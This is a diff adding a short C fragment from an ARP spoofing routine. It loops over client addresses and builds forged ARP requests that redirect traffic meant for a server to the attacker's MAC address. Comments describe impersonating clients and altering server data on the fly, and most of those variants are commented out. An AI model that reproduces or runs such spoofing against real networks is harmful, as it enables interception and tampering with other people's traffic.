@@ -1,0 +1,24 @@
+// > START -> Declared in "arpSpoof();"
+	// > Generate requests
+	for (int i = 0; i < ipCount; i++)
+	{
+		// > Let's tell all the clients that we're the IP they're looking for
+
+		// [CLIENT]
+		// -> If the client is sending stuff to the server, send it to our MAC address
+		generate_arp_request(spoofData[i].arpClientReq, if_mac, ARP_SERVER_IP, spoofData[i].ip);
+		//generate_arp_request(spoofData[i].arpClientReq, if_mac, spoofData[i].ip, ARP_SERVER_IP);
+		// -> Let's make our reply come from our device, impersonating the client's mac address, coming from their IP, going to the server
+		//generate_arp_reply(spoofData[i].arpClientReply, if_mac, victim_mac, spoofData[i].ip, ARP_SERVER_IP);
+
+		// [SERVER]
+		// -> Let's change the data the server is sending to a client on-the-fly so they don't receive the data they want to receive
+		//generate_arp_reply(spoofData[i].arpServReply, if_mac, victim_mac, spoofData[i].ip, ARP_SERVER_IP);
+		//generate_arp_request(spoofData[i].arpServReq, if_mac, spoofData[i].ip, ARP_SERVER_IP);
+
+		// [ROUTER]
+		// > SYSTEM 1 -> ARP REQUEST -> SYSTEM 2 -> ARP REPLY -> BACK TO SYSTEM 1
+		//generate_arp_request(spoofData[i].arpGatewayRequest, if_mac, spoofData[i].ip, ARP_DEFGW_IP);
+		//generate_arp_reply(spoofData[i].arpGatewayReply, if_mac, gateway_mac, spoofData[i].ip, ARP_DEFGW_IP);
+	}
+// < END
